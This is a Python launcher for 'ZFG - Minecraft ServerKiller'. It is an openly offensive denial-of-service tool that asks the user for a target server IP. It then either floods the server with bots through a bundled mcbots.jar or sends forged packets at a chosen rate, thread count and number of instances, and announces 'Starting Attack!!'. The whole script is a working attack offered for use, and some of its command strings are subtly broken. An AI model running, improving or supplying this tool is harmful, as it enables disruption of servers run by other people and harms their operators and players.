# NATIVE IMPORTS
from sys import exit, argv
from os import path, system, listdir, getcwd, chdir
from subprocess import Popen
#####################################################
# 
# https://github.com/WarBringerLT/
# ZFG - Minecraft ServerKiller @@@@@ By: WarBringerLT
# Version: v1
# 2022 - 06 - 06
# 
# Additional Credit: 
# > GitHub @ Szczurowsky
# > GitHub @ crpmax
#####################################################
chdir(path.dirname(argv[0])) # Set Working Dir to Script Location
App_Version = "v1.0"
LauncherPath = getcwd()
Dependencies_MCBots = LauncherPath + '/Dependencies/mcbots.jar'
Dependencies_CustomPackets = LauncherPath + '/Dependencies/CustomPacket.py'
Dependencies_CustomPackets_Modules = LauncherPath + '/Dependencies/packet/'
#####################################################
print(f"""
#######################################################
#                                                     #
# ZFG - Minecraft ServerKiller @@@@@ By: WarBringerLT #
# Version: {App_Version}                                       #
# 2022 - 06 - 06                                      #
#                                                     #
# Additional Credit:                                  #
# > GitHub @ Szczurowsky                              #
# > GitHub @ crpmax                                   #
#######################################################""")

print("\n\n[~] Importing Logging Engine...")
try: # Load Logging Module
	from Dependencies.Logger_Stripped import * # https://github.com/WarBringerLT/PythonLoggingSimplifier
	Logger = Logging()
	Logger.log("[+] Logger Started!")
	Logger.log("Importing and verifying all other Dependencies...")
except ImportError: exit(print(input("[!] Failed to load Logging Module! Please refer to GitHub Page to download the Dependencies. \n\n\n[Program Terminated.] = Press ENTER to Exit.")))
try: # Check and Verify 'mcbots.jar' & CustomPackets
	if path.isfile(Dependencies_MCBots) == False or path.isfile(Dependencies_CustomPackets) == False:
		Logger.log(f"Could not find \"{Dependencies_MCBots}\"! Please refer to GitHub Page to download the Dependencies.")
		exit(input("\n\n\n[Program Terminated.] = Press ENTER to Exit."))
except ImportError: exit(input("[!] Failed to load required libs! Please refer to GitHub Page to download the Dependencies. \n\n\n[Program Terminated.] = Press ENTER to Exit."))
packets_modules = listdir(Dependencies_CustomPackets_Modules)
verified = []
for item in packets_modules:
    if '__' in item: pass
    elif item == 'utility.py': pass
    else: verified.append(item.strip('.py'))
Logger.log(f"[+] Found total: {len(verified)} modules for CustomPackets!")
Logger.log("[+] Everything loaded correctly, Loading UP! ~~ Starting GUI ~~")

Menu = """
====[ ZFG ServerKiller - Menu ]====
[1] Spam-full server with bots
[2] Send Custom-forged Packets

'menu' - to clear screen and show menu
[0/q] Exit"""
print(Menu)

Choice = '-1'

while Choice == '-1':
	Choice = str(input("\n\n[>] Your Choice: "))
	if Choice.lower() == "q" or Choice == "0": exit(Logger.log("User-requested Exit. Terminating! Byeeee"))
	elif Choice == "1": # Select Dependencies_MCBots
		
		Arguments = []
		Dependencies_MCBots = Dependencies_MCBots.replace('/','\\')
		Logger.log(f"[>] Selected: \"{Dependencies_MCBots}\"!")
		Server_IP = input("Enter Server IP (IP:Port together): ")
		print("[!!] Join Interval is in Milisecond format! - 1000 = 1s [Press Enter to use Defaults]")
		Interval_min = input("Enter Minimum join Interval (ms) (default: 4000): ")
		Interval_max = input("Enter Maximum join Interval (ms) (default: 5000): ")
		Quantity_Bot = input("How many bots?                   (default: 1): ")
		Real_Names   = input("Generate Real Names?      (y/n)    (default: n): ")
		Send_Msg     = input("Want to send message, if yes, enter it here (default: blank/no msg): ")
		Instances    = input("How many Instances? (Default: 1): ")

		if len(Send_Msg) == 0: Send_Msg = False
		
		Arguments.append(f'-s {Server_IP} ')
		if len(Interval_min) == 0: Interval_min = 4000 # Use Default if empty
		if len(Interval_max) == 0: Interval_max = 5000 # Use Default if empty
		if len(Quantity_Bot) == 0: Quantity_Bot = 1    # Use Default if Empty
		Arguments.append(f'-d {Interval_min} {Interval_max} ')
		Arguments.append(f'-c {Quantity_Bot} ')
		if Real_Names == "y": Arguments.append('-r ')  # Use Default if empty (if not 'y' - don't append.)
		if int(Quantity_Bot) > 500 and int(Quantity_Bot) < 1000 and bool(Send_Msg) == False: Arguments.append('-m ') # Minimal run (no chat/no listeners) When MANY BOTS # WILL NOT BE ENABLED IF SEND_MSG IS ADDED
		if int(Quantity_Bot) > 1000 and bool(Send_Msg) == False: Arguments.append('-x ')  # MOST Minimal run. Maximum amount of mcbots # WILL NOT BE ENABLED IF SEND_MSG IS ADDED
		if bool(Send_Msg) == True: Arguments.append(f'-j {Send_Msg} ') # If Send_Msg contains something, add it as a send_message

		Arg_String = f"java -jar \"{Dependencies_MCBots}\" "
		for arg in Arguments:
			Arg_String += arg
		Arg_String += ""

		Logger.log("[!] Starting Attack!! [Spawning a new console window...]")
		Logger.log(f"[>] Runtime Arguments: {Arguments}")

		Logger.log("[~] Opening ({Instances}) Instances = [State: STARTING]")
		if Instances == "1" or len(Instances) == 0: system(f"{Arg_String}")
		else: 

			for i in range(0,int(Instances)): Popen(f"cmd.exe /c {Arg_String}")


		Choice = 'menu' # At the end, go back to menu.
	elif Choice == "2": 
		
		Arguments = []
		Dependencies_CustomPackets = Dependencies_CustomPackets.replace('/','\\')
		Logger.log(f"[>] Selected: \"{Dependencies_CustomPackets}\"!")

		Server_IP = input("Enter Server IP (IP:Port) (if no port, default: 25565): ")

		try: 
			Server_Port = Server_IP.split(":")[1]
		except IndexError: 
			Server_Port = 25565
		
		Logger.log(f"[>>] Selected Target IP   = {Server_IP.split(':')[0]}")
		Logger.log(f"[>>] Selected Target Port = {Server_Port}")
		Arguments.append(f'-a {Server_IP.split(":")[0]} ')
		Arguments.append(f'-p {Server_Port} ')

		Duration = input("Duration (Seconds) - (default: 60): ")
		if len(Duration) == 0: Duration = 60
		Logger.log(f"[>>] Selected Duration = {Duration}")
		Arguments.append(f'-t {Duration} ')

		Threads = input("Threads - (default: 8): ")
		if len(Threads) == 0: Threads = 8
		Logger.log(f"[>>] Selected Threads = {Threads}")
		Arguments.append(f'-th {Threads} ')

		PPS = input("Packets Per Second (PPS) - (default: 100): ")
		if len(PPS) == 0: PPS = 100
		Logger.log(f"[>>] Selected PPS = {PPS}")
		Arguments.append(f'-pps {PPS} ')
		Use_Module=''
		while Use_Module not in verified:
			print(f"Available Modules: {verified}")
			Use_Module   = input("Select Module (enter full module name): ")
		Logger.log(f"[>>] Selected Module: {Use_Module}")
		Arguments.append(f'-m {Use_Module} ')
		print("[~] Find all protocol versions at: https://wiki.vg/Protocol_version_numbers#Versions_after_the_Netty_rewrite")
		Protocol_Version = input("Select Protocol Version (default: 758 - 1.18.2): ")
		if len(Protocol_Version) == 0: Protocol_Version = 758
		Logger.log(f"[>>] Selected Protocol = {Protocol_Version}")
		Arguments.append(f'-pv {Protocol_Version} ')

		Instances    = input("How many Instances? (Default: 1): ")
		if len(Instances) == 0: Instances = "1"
		Logger.log(f"[>>] Selected Instances = {Instances}")

		Logger.log("[!] Starting Attack!! [Spawning a new console window...]")
		Logger.log(f"[>] Runtime Arguments: {Arguments}")
		Logger.log("[~] Opening ({Instances}) Instances = [State: STARTING]")


		Arg_String = f"start python \"{Dependencies_CustomPackets}\" "
		for arg in Arguments:
			Arg_String += arg
		Arg_String = Arg_String.replace("/",'\\')

		if Instances == "1" or len(Instances) == 0: Popen("{Arg_String}", shell=True)
		else:
			Logger.log(f"Full start command: {Arg_String}")
			for i in range(0,int(Instances)): Popen(f"{Arg_String}", shell=True)

		Choice = 'menu' # At the end, go back to menu.
	elif Choice == "menu":
		print('\n'*100)
		print(Menu)
		Choice = -1

	else: 
		print("working on it.")
		Choice = -1